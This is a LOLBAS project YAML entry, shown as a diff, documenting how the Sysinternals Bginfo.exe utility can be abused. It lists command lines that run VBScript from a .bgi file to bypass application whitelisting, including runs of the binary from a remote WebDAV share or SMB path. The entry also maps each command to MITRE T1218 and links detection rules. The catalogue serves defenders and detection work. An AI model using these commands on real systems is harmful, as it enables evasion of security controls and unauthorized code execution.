@@ -1,0 +1,75 @@
+<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OtherMSBinaries/Bginfo.yml -->
+---
+Name: Bginfo.exe
+Description: Background Information Utility included with SysInternals Suite
+Author: Oddvar Moe
+Created: 2018-05-25
+Commands:
+  - Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
+    Description: Execute VBscript code that is referenced within the specified .bgi file.
+    Usecase: Local execution of VBScript
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows
+    Tags:
+      - Execute: WSH
+  - Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
+    Description: Execute VBscript code that is referenced within the specified .bgi file.
+    Usecase: Local execution of VBScript
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows
+    Tags:
+      - Execute: WSH
+  - Command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
+    Usecase: Remote execution of VBScript
+    Description: Execute bginfo.exe from a WebDAV server.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    Tags:
+      - Execute: WSH
+    OperatingSystem: Windows
+  - Command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
+    Usecase: Remote execution of VBScript
+    Description: Execute bginfo.exe from a WebDAV server.
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows
+    Tags:
+      - Execute: WSH
+  - Command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
+    Usecase: Remote execution of VBScript
+    Description: This style of execution may not longer work due to patch.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows
+    Tags:
+      - Execute: WSH
+      - Execute: Remote
+  - Command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
+    Usecase: Remote execution of VBScript
+    Description: This style of execution may not longer work due to patch.
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows
+    Tags:
+      - Execute: WSH
+      - Execute: Remote
+Full_Path:
+  - Path: no default
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml
+  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
+  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
+Resources:
+  - Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
+Acknowledgement:
+  - Person: Oddvar Moe
+    Handle: '@oddvarmoe'
